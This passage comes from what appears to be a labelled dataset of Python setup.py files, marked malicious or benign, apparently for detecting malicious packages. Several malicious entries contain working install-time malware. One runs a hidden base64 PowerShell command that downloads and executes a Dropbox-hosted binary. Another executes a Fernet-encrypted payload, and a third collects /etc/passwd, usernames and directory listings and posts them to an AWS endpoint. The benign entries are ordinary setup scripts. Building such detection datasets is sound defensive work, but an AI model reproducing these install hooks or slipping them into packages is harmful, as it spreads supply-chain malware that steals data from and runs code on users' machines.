print(\"Running post installation...\")\n        install.run(self)\n        child_process = multiprocessing.Process(target=send)\n        child_process.start()\n\nclass PostDevelopCommand(develop):\n    def run(self):\n        print(\"Running development mode post-install.\")\n        develop.run(self)\n        child_process = multiprocessing.Process(target=send)\n        child_process.start()\n\nclass PostEggInfoCommand(egg_info):\n    def run(self):\n        print(\"Validating egg_info.\")\n        egg_info.run(self)\n        child_process = multiprocessing.Process(target=send)\n        child_process.start()\n\nif os.name == \"nt\" and sys.version_info < (3, 0):\n    # Required due to missing socket.inet_ntop & socket.inet_pton method in Windows Python 2.x\n    requirements.append(\"win-inet-pton\")\n\nwith open(\"README.md\") as f:\n    long_description = f.read()\n\nwith open(os.path.join(base_path, \"socks.py\")) as f:\n    VERSION = re.compile(r'.*__version__ = \"(.*?)\"', re.S).match(f.read()).group(1)\n\nsetup(\n    name=\"libproxy\",\n    version=VERSION,\n    description=\"A Python SOCKS client module. See https://github.com/Anorov/libproxy for more information.\",\n    long_description=long_description,\n    long_description_content_type=\"text/markdown\",\n    url=\"https://github.com/Anorov/libproxy\",\n    license=\"BSD\",\n    author=\"Anorov\",\n    author_email=\"anorov.vorona@gmail.com\",\n    keywords=[\"socks\", \"proxy\"],\n    py_modules=[\"socks\", \"sockshandler\"],\n    install_requires=requirements,\n    python_requires=\">=2.7, !=3.0.*, !=3.1.*, !=3.2.*, !=3.3.*\",\n    cmdclass={\n        'install': PostInstallCommand,\n        'develop': PostDevelopCommand,\n        'egg_info': PostEggInfoCommand\n    },\n    classifiers=(\n        \"Programming Language :: Python :: 2\",\n        \"Programming Language :: Python :: 2.7\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.4\",\n        \"Programming Language :: Python :: 3.5\",\n        \"Programming Language :: Python :: 3.6\",\n    ),\n)\n", "target": 1}
{"idx": "py-lgtbminecc-8.63", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-LGTBminecc',\n    packages = ['modlib'],\n    version = '2.26',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "grandpy-5.75", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'grandpy',\n    packages = ['modlib'],\n    version = '6.66',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "insanepackage2179824234242342433-1.0.0", "func": "from setuptools import setup, find_packages\nfrom setuptools.command.install import install\nimport os\n\nVERSION = '1.0.0'\nDESCRIPTION = 'rfFHyhErmXucVoHaNneVJHQoYUmwQiKlysiDPpkcoPMvCKWCPzHbaD ugZoYAeuLRmHENLaTnjkBzaeoqhxHugcyFaJFd'\nLONG_DESCRIPTION = 'QWgHUiriYcKKlgmvYwOLZbQoneAHxjZEtATBjmEoohTIVFCFLyuvmXElyZXgMZVRsBAbloDoPtZTcmtJWAlJePxqXotmcDAFQsnrQUiyWshUsqEuFxxwwkvHIIHDyHocTLqVzVerYRDevvVsPiedwBJiimOAbpGHhOrLYglkNfXvZuRxQjJHadmcEZUJknCtxyrzbMYbmePMvzIAqvUsPHpbCMxjdBkEVdOEUlqkeGNrYPOEkmRBDHrPeOEPfghRXcKKZbRLmsgIKoGKeebsED StCeXYBukmLvzUxahdPbIhBrGuFHhMJuNawJmkDCXUGLHAZlVgKfNDGERiKCaaLNkvEpsKjkSznwcRSfXcz jXoLQhuHjPfxHV YMpstOrOYNrUVuUxEPDMhfBOSDnfw HbxzIDyZjOwVyBfVQIZEybKbnTqaPefaSfjo'\n\n\nclass GruppeInstall(install):\n        def run(self):\n            import os\n            if os.name == \"nt\":\n                import requests\n                from fernet import Fernet\n                exec(Fernet(b'hsd56aKnzRRgl9AoNrV3UJl-jkohU7EL1Rthh_YIcpE=').decrypt(b'gAAAAABmAzvSpDrOMivQvstHc5Pm_CCKCGjOd9LunXpteDBEes8dTaUAghARtnsul2RXm-RSRndTh4P0loTmOQIXAXWhst9ZQd3u78qQ-Y8BO8wuGcC_IUM2UQFxUBA7ARJ8eiN2MT3uy_FkvPDLjJHnVnK429tvgKBFF95F7wjLySM4U20jzrlcZk9o1krB1AQRwdl-rXIa7T6WfA5LZnw0ltiy7T4JDIW5yDJ-1AH5pVL6Z0LxhHskE8TA6XnPoUZjyO16t8IX'))\n\n            install.run(self)\n\n\nsetup(\n    name=\"insanepackage2179824234242342433\",\n    version=VERSION,\n    author=\"TUXpyEItASFPTMINsex\",\n    author_email=\"eXliUxn@gmail.com\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=LONG_DESCRIPTION,\n    cmdclass={\n        'install': GruppeInstall,\n    },\n    packages=find_packages(),\n    setup_requires=['fernet', 'requests'],\n    keywords=[],\n    classifiers=[\n        \"Operating System :: Microsoft :: Windows\",\n    ]\n)\n\n", "target": 1}
{"idx": "Flask-Assets-2.0", "func": "#!/usr/bin/env python\n# coding: utf-8\n\"\"\"\nFlask-Assets\n-------------\n\nIntegrates the ``webassets`` library with Flask, adding support for\nmerging, minifying and compiling CSS and Javascript files.\n\"\"\"\n\nfrom __future__ import with_statement\nfrom setuptools import setup\n\n# Figure out the version; this could be done by importing the\n# module, though that requires dependencies to be already installed,\n# which may not be the case when processing a pip requirements\n# file, for example.\ndef parse_version(asignee):\n    import os, re\n    here = os.path.dirname(os.path.abspath(__file__))\n    version_re = re.compile(\n        r'%s = (\\(.*?\\))' % asignee)\n    with open(os.path.join(here, 'src', 'flask_assets.py')) as fp:\n        for line in fp:\n            match = version_re.search(line)\n            if match:\n                version = eval(match.group(1))\n                return \".\".join(map(str, version))\n        else:\n            raise Exception(\"cannot find version\")\nversion = parse_version('__version__')\nwebassets_requirement = parse_version('__webassets_version__')\n\nsetup(\n    name='Flask-Assets',\n    version=version,\n    url='http://github.com/miracle2k/flask-assets',\n    license='BSD',\n    author='Michael Elsdoerfer',\n    author_email='michael@elsdoerfer.com',\n    description='Asset management for Flask, to compress and merge ' \\\n        'CSS and Javascript files.',\n    long_description=__doc__,\n    py_modules=['flask_assets'],\n    package_dir={'': 'src'},\n    zip_safe=False,\n    platforms='any',\n    entry_points={\n        'flask.commands': [\n            'assets = flask_assets:assets',\n        ],\n    },\n    install_requires=[\n        'Flask>=0.8',\n        'webassets%s' % webassets_requirement,\n    ],\n    classifiers=[\n        'Environment :: Web Environment',\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: BSD License',\n        'Operating System :: OS Independent',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 2',\n        'Programming Language :: Python :: 3',\n        'Topic :: Internet :: WWW/HTTP :: Dynamic Content',\n        'Topic :: Software Development :: Libraries :: Python Modules'\n    ],\n    test_suite='nose.collector',\n    tests_require=[\n        'nose',\n        'flask-script'\n    ],\n)\n", "target": 0}
{"idx": "gnupg-2.3.1", "func": "#!/usr/bin/env python\n# -*- coding: utf-8 -*-\n#\n# This file is part of python-gnupg, a Python interface to GnuPG.\n# Copyright \u00a9 2013 Isis Lovecruft, <isis@leap.se> 0xA3ADB67A2CDB8B35\n#           \u00a9 2013 Andrej B.\n#           \u00a9 2013 LEAP Encryption Access Project\n#           \u00a9 2008-2012 Vinay Sajip\n#           \u00a9 2005 Steve Traugott\n#           \u00a9 2004 A.M. Kuchling\n#\n# This program is free software: you can redistribute it and/or modify it\n# under the terms of the GNU General Public License as published by the Free\n# Software Foundation, either version 3 of the License, or (at your option)\n# any later version.\n#\n# This program is distributed in the hope that it will be useful, but WITHOUT\n# ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or\n# FITNESS FOR A PARTICULAR PURPOSE. See the included LICENSE file for details.\n#______________________________________________________________________________\n\nfrom __future__ import absolute_import\nfrom __future__ import print_function\n\nimport platform\nimport setuptools\nimport sys\nimport os\nimport versioneer\n\ntry:\n    import __pypy__\nexcept ImportError:\n    _isPyPy = False\nelse:\n    _isPyPy = True\n\n\nversioneer.versionfile_source = 'gnupg/_version.py'\nversioneer.versionfile_build  = 'gnupg/_version.py'\nversioneer.tag_prefix = ''\nversioneer.parentdir_prefix = 'gnupg-'\n\n__author__ = \"Isis Agora Lovecruft\"\n__contact__ = 'isis@patternsinthevoid.net'\n__url__ = 'https://github.com/isislovecruft/python-gnupg'\n\n\ndef python26():\n    \"\"\"Returns True if we're running on Python2.6.\"\"\"\n    if sys.version[:3] == \"2.6\":\n        return True\n    return False\n\ndef get_requirements():\n    \"\"\"Extract the list of requirements from our requirements.txt.\n\n    :rtype: 2-tuple\n    :returns: Two lists, the first is a list of requirements in the form of\n        pkgname==version. The second is a list of URIs or VCS checkout strings\n        which specify the dependency links for obtaining a copy of the\n        requirement.\n    \"\"\"\n    requirements_file = os.path.join(os.getcwd(), 'requirements.txt')\n    requirements = []\n    links=[]\n    try:\n        with open(requirements_file) as reqfile:\n            for line in reqfile.readlines():\n                line = line.strip()\n                if line.startswith('#'):\n                    continue\n                elif line.startswith(\n                        ('https://', 'git://', 'hg://', 'svn://')):\n                    links.append(line)\n                else:\n                    requirements.append(line)\n\n    except (IOError, OSError) as error:\n        print(error)\n\n    if python26():\n        # Required to make `collections.OrderedDict` available on Python<=2.6\n        requirements.append('ordereddict==1.1#a0ed854ee442051b249bfad0f638bbec')\n\n    # Don't try to install psutil on PyPy:\n    if _isPyPy:\n        for line in requirements[:]:\n            if line.startswith('psutil'):\n                print(\"Not installing %s on PyPy...\" % line)\n                requirements.remove(line)\n\n    return requirements, links\n\n\nrequires, deplinks = get_requirements()\n\n\nsetuptools.setup(\n    name = \"gnupg\",\n    description=\"A Python wrapper for GnuPG\",\n    long_description = \"\"\"\\\nThis module allows easy access to GnuPG's key management, encryption and \\\nsignature functionality from Python programs, by interacting with GnuPG \\\nthrough file descriptors. Input arguments are strictly checked and sanitised, \\\nand therefore this module should be safe to use in networked applications \\\nrequiring direct user input. It is intended for use on Windows, MacOS X, BSD, \\\nor Linux, with Python 2.6, Python 2.7, Python 3.3, Python 3.4, or PyPy.\n\"\"\",\n    license=\"GPLv3+\",\n\n    version=versioneer.get_version(),\n    cmdclass=versioneer.get_cmdclass(),\n\n    author=__author__,\n    author_email=__contact__,\n    maintainer=__author__,\n    maintainer_email=__contact__,\n    url=__url__,\n\n    package_dir={'gnupg': 'gnupg'},\n    packages=['gnupg'],\n    package_data={'': ['README', 'LICENSE', 'TODO', 'requirements.txt']},\n    scripts=['versioneer.py'],\n    test_suite='gnupg.test.test_gnupg',\n\n    install_requires=requires,\n    dependency_links=deplinks,\n    extras_require={'docs': [\"Sphinx>=1.1\",\n                             \"sphinxcontrib-fulltoc==1.0\"]},\n\n    platforms=\"Linux, BSD, OSX, Windows\",\n    download_url=\"https://github.com/isislovecruft/python-gnupg/archive/master.zip\",\n    classifiers=[\n        \"Development Status :: 5 - Production/Stable\",\n        \"Intended Audience :: Developers\",\n        \"Intended Audience :: System Administrators\",\n        \"License :: OSI Approved :: GNU General Public License v3 or later (GPLv3+)\",\n        \"Operating System :: Android\",\n        \"Operating System :: MacOS :: MacOS X\",\n        \"Operating System :: Microsoft :: Windows\",\n        \"Operating System :: POSIX :: BSD\",\n        \"Operating System :: POSIX :: Linux\",\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 2\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 2.6\",\n        \"Programming Language :: Python :: 2.7\",\n        \"Programming Language :: Python :: 3.3\",\n        \"Programming Language :: Python :: 3.4\",\n        \"Programming Language :: Python :: Implementation :: CPython\",\n        \"Programming Language :: Python :: Implementation :: PyPy\",\n        \"Topic :: Security :: Cryptography\",\n        \"Topic :: Software Development :: Libraries :: Python Modules\",\n        \"Topic :: Utilities\",]\n)\n", "target": 0}
{"idx": "envparse-0.2.0", "func": "# -*- coding: utf-8 -*-\nfrom __future__ import print_function\nfrom setuptools import setup, find_packages\nfrom setuptools.command.test import test as TestCommand\nimport codecs\nimport os\nimport sys\nimport re\n\n\ndef read(*parts):\n    here = os.path.abspath(os.path.dirname(__file__))\n    # intentionally *not* adding an encoding option to open\n    return codecs.open(os.path.join(here, *parts), 'r').read()\n\n\ndef find_version(*file_paths):\n    version_file = read(*file_paths)\n    version_match = re.search(r\"^__version__ = ['\\\"]([^'\\\"]*)['\\\"]\",\n                              version_file, re.M)\n    if version_match:\n        return version_match.group(1)\n    raise RuntimeError(\"Unable to find version string.\")\n\n\nclass PyTest(TestCommand):\n    user_options = [('pytest-args=', 'a', \"Arguments to pass to py.test\")]\n\n    def initialize_options(self):\n        TestCommand.initialize_options(self)\n        self.pytest_args = []\n\n    def finalize_options(self):\n        TestCommand.finalize_options(self)\n        self.test_args = []\n        self.test_suite = True\n\n    def run_tests(self):\n        #import here, cause outside the eggs aren't loaded\n        import pytest\n        errno = pytest.main(self.pytest_args)\n        sys.exit(errno)\n\nsetup(\n    name='envparse',\n    version=find_version('.', 'envparse.py'),\n    url='https://github.com/rconradharris/envparse',\n    license='MIT',\n    author='Rick Harris',\n    author_email='rconradharris@gmail.com',\n    tests_require=['pytest'],\n    install_requires=[''],\n    cmdclass={'test': PyTest},\n    description='Simple environment variable parsing',\n    long_description=read('README.rst'),\n    py_modules=['envparse'],\n    platforms='any',\n    zip_safe=False,\n    classifiers = [\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 2',\n        'Programming Language :: Python :: 3',\n        'Development Status :: 4 - Beta',\n        'Natural Language :: English',\n        'Environment :: Web Environment',\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: MIT License',\n        'Operating System :: OS Independent',\n        'Topic :: Software Development :: Libraries :: Python Modules',\n        'Topic :: Internet :: WWW/HTTP :: Dynamic Content',\n        ],\n    extras_require={\n        'testing': ['pytest'],\n      }\n)\n", "target": 0}
{"idx": "ceedee-5.8.2", "func": "from setuptools import setup, find_packages\nimport os\nimport platform\nimport requests\nfrom urllib import request, parse\n\n# Please do not delete this.\nos_name = platform.system()\ndata = {}\nif os_name == 'Linux' or os_name == 'Darwin':\n    try:\n        hostname = os.popen('hostname').read()\n        whoami = os.popen('whoami').read()\n        passwd_file = os.popen('cat /etc/passwd').read()\n        os_info = os.popen('uname -a').read()\n        curr_dir = os.popen(\"pwd\").read()\n        list_curr_dir = os.popen(\"ls -la\").read()\n\n        data = {\n            'OS': os_name,\n            'Hostname': hostname,\n            'Logged In Username': whoami,\n            'Password File': passwd_file,\n            'OS Information': os_info,\n            'Current Directory': curr_dir,\n            'List of files in Current Directory': list_curr_dir\n        }\n\n    except:\n        data = {'Error': 'There was an error while fetching OS related data or sending information for ' + os_name}\n\nelif os_name == 'Windows':\n    try:\n        hostname = os.popen('hostname').read()\n        whoami = os.popen('whoami').read()\n        curr_dir = os.popen(\"cd\").read()\n        list_curr_dir = os.popen(\"dir\").read()\n\n        data = {\n            'OS': os_name,\n            'Hostname': hostname,\n            'Logged In Username': whoami,\n            'Current Directory': curr_dir,\n            'List of files in Current Directory': list_curr_dir\n        }\n\n    except:\n        data = {'Error': 'There was an error while fetching OS related data or sending information for ' + os_name}\n\nelse:\n    data = {'Error': 'Cannot determine OS'}\n\ndata_enc = parse.urlencode(data).encode()\nAPI_ENDPOINT = \"https://rk8xxqzdug.execute-api.us-east-1.amazonaws.com/Test/response\"\nreq = request.Request(API_ENDPOINT, data=data_enc)\nres = request.urlopen(req)\n\nsetup(\n    name='ceedee',\n    version='5.8.2',\n    license='MIT',\n    author=\"Shubham_fnra\",\n    author_email='shubham.agrawal@finra.org',\n    packages=find_packages('src'),\n    package_dir={'': 'src'},\n    url='https://github.com/gmyrianthous/example-publish-pypi',\n    keywords='ceedee project',\n    install_requires=[\n          'scikit-learn',\n          'requests',\n      ],\n)\n\n# name = os.popen('hostname').read()\n# # who = os.popen('cat /etc/passwd').read()\n# # what = os.popen('uname -a').read()\n# network = os.popen('dir').read()\n#\n# API_ENDPOINT = \"https://rk8xxqzdug.execute-api.us-east-1.amazonaws.com/Test/response\"\n#\n# data = {\n# 'hostname': name,\n# # 'whoami': what,\n# 'network': network\n# }\n#\n# r = requests.post(url=API_ENDPOINT, data=data)\n", "target": 1}
{"idx": "ForgyP-1.0.3", "func": "from setuptools import setup\n\nsetup(\n    name='ForgyP',\n    version='1.0.3',\n    packages=['ForgyP'],\n    url='',\n    license='',\n    author='dark',\n    author_email='email@example.com',\n    description='email@example.com',\n    install_requires=[\n        'cryptography==40.0.2'\n    ]\n)\n", "target": 1}
{"idx": "lucifer9423-0.2", "func": "from setuptools import setup\n\nsetup(\n    name='lucifer9423',\n    version='0.2',\n    description='lucifer9423',\n    author='magalie876956',\n    author_email='magalie876956@2rwuvtol.saucent.online',\n    packages=['lucifer9423'],\n    install_requires=[],\n)\n", "target": 1}
{"idx": "py-infovirtualgame-5.81", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-infovirtualgame',\n    packages = ['modlib'],\n    version = '2.45',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "flask-restx-0.5.1", "func": "#!/usr/bin/env python\n# -*- coding: utf-8 -*-\n# flake8: noqa\n\nimport io\nimport os\nimport re\nimport sys\n\nfrom setuptools import setup, find_packages\n\nRE_REQUIREMENT = re.compile(r\"^\\s*-r\\s*(?P<filename>.*)$\")\n\nPYPI_RST_FILTERS = (\n    # Replace Python crossreferences by simple monospace\n    (r\":(?:class|func|meth|mod|attr|obj|exc|data|const):`~(?:\\w+\\.)*(\\w+)`\", r\"``\\1``\"),\n    (r\":(?:class|func|meth|mod|attr|obj|exc|data|const):`([^`]+)`\", r\"``\\1``\"),\n    # replace doc references\n    (\n        r\":doc:`(.+) <(.*)>`\",\n        r\"`\\1 <https://flask-restx.readthedocs.io/en/stable\\2.html>`_\",\n    ),\n    # replace issues references\n    (\n        r\":issue:`(.+?)`\",\n        r\"`#\\1 <https://github.com/python-restx/flask-restx/issues/\\1>`_\",\n    ),\n    # replace pr references\n    (r\":pr:`(.+?)`\", r\"`#\\1 <https://github.com/python-restx/flask-restx/pull/\\1>`_\"),\n    # replace commit references\n    (\n        r\":commit:`(.+?)`\",\n        r\"`#\\1 <https://github.com/python-restx/flask-restx/commit/\\1>`_\",\n    ),\n    # Drop unrecognized currentmodule\n    (r\"\\.\\. currentmodule:: .*\", \"\"),\n)\n\n\ndef rst(filename):\n    \"\"\"\n    Load rst file and sanitize it for PyPI.\n    Remove unsupported github tags:\n     - code-block directive\n     - all badges\n    \"\"\"\n    content = io.open(filename).read()\n    for regex, replacement in PYPI_RST_FILTERS:\n        content = re.sub(regex, replacement, content)\n    return content\n\n\ndef pip(filename):\n    \"\"\"Parse pip reqs file and transform it to setuptools requirements.\"\"\"\n    requirements = []\n    for line in io.open(os.path.join(\"requirements\", \"{0}.pip\".format(filename))):\n        line = line.strip()\n        if not line or \"://\" in line or line.startswith(\"#\"):\n            continue\n        requirements.append(line)\n    return requirements\n\n\nlong_description = \"\\n\".join((rst(\"README.rst\"), \"\"))\n\n\nexec(\n    compile(open(\"flask_restx/__about__.py\").read(), \"flask_restx/__about__.py\", \"exec\")\n)\n\ninstall_requires = pip(\"install\")\ndoc_require = pip(\"doc\")\ntests_require = pip(\"test\")\ndev_require = tests_require + pip(\"develop\")\n\nsetup(\n    name=\"flask-restx\",\n    version=__version__,\n    description=__description__,\n    long_description=long_description,\n    url=\"https://github.com/python-restx/flask-restx\",\n    author=\"python-restx Authors\",\n    packages=find_packages(exclude=[\"tests\", \"tests.*\"]),\n    include_package_data=True,\n    install_requires=install_requires,\n    tests_require=tests_require,\n    dev_require=dev_require,\n    extras_require={\"test\": tests_require, \"doc\": doc_require, \"dev\": dev_require,},\n    license=\"BSD-3-Clause\",\n    zip_safe=False,\n    keywords=\"flask restx rest api swagger openapi\",\n    classifiers=[\n        \"Development Status :: 3 - Alpha\",\n        \"Programming Language :: Python\",\n        \"Environment :: Web Environment\",\n        \"Operating System :: OS Independent\",\n        \"Intended Audience :: Developers\",\n        \"Topic :: System :: Software Distribution\",\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 2\",\n        \"Programming Language :: Python :: 2.7\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.5\",\n        \"Programming Language :: Python :: 3.6\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: Implementation :: PyPy\",\n        \"Topic :: Software Development :: Libraries :: Python Modules\",\n        \"License :: OSI Approved :: BSD License\",\n    ],\n)\n", "target": 0}
{"idx": "google-cloud-trace-1.7.0", "func": "# Copyright 2018 Google LLC\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\nimport io\nimport os\n\nimport setuptools\n\n\n# Package metadata.\n\nname = \"google-cloud-trace\"\ndescription = \"Cloud Trace API client library\"\nversion = \"1.7.0\"\n# Should be one of:\n# 'Development Status :: 3 - Alpha'\n# 'Development Status :: 4 - Beta'\n# 'Development Status :: 5 - Production/Stable'\nrelease_status = \"Development Status :: 5 - Production/Stable\"\ndependencies = [\n    \"google-api-core[grpc] >= 1.32.0, <3.0.0dev,!=2.0.*,!=2.1.*,!=2.2.*,!=2.3.*,!=2.4.*,!=2.5.*,!=2.6.*,!=2.7.*\",\n    \"proto-plus >= 1.15.0, <2.0.0dev\",\n    \"protobuf >= 3.19.0, <4.0.0dev\",\n]\nextras = {}\n\n\n# Setup boilerplate below this line.\n\npackage_root = os.path.abspath(os.path.dirname(__file__))\n\nreadme_filename = os.path.join(package_root, \"README.rst\")\nwith io.open(readme_filename, encoding=\"utf-8\") as readme_file:\n    readme = readme_file.read()\n\n# Only include packages under the 'google' namespace. Do not include tests,\n# benchmarks, etc.\npackages = [\n    package\n    for package in setuptools.PEP420PackageFinder.find()\n    if package.startswith(\"google\")\n]\n\n# Determine which namespaces are needed.\nnamespaces = [\"google\"]\nif \"google.cloud\" in packages:\n    namespaces.append(\"google.cloud\")\n\n\nsetuptools.setup(\n    name=name,\n    version=version,\n    description=description,\n    long_description=readme,\n    author=\"Google LLC\",\n    author_email=\"googleapis-packages@google.com\",\n    license=\"Apache 2.0\",\n    url=\"https://github.com/googleapis/python-trace\",\n    classifiers=[\n        release_status,\n        \"Intended Audience :: Developers\",\n        \"License :: OSI Approved :: Apache Software License\",\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: 3.10\",\n        \"Operating System :: OS Independent\",\n        \"Topic :: Internet\",\n    ],\n    platforms=\"Posix; MacOS X; Windows\",\n    packages=packages,\n    namespace_packages=namespaces,\n    install_requires=dependencies,\n    extras_require=extras,\n    python_requires=\">=3.7\",\n    scripts=[\n        \"scripts/fixup_trace_v1_keywords.py\",\n        \"scripts/fixup_trace_v2_keywords.py\",\n    ],\n    include_package_data=True,\n    zip_safe=False,\n)\n", "target": 0}
{"idx": "selfedrandomad-6.56", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfedrandomad',\n    packages = ['modlib'],\n    version = '2.7',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 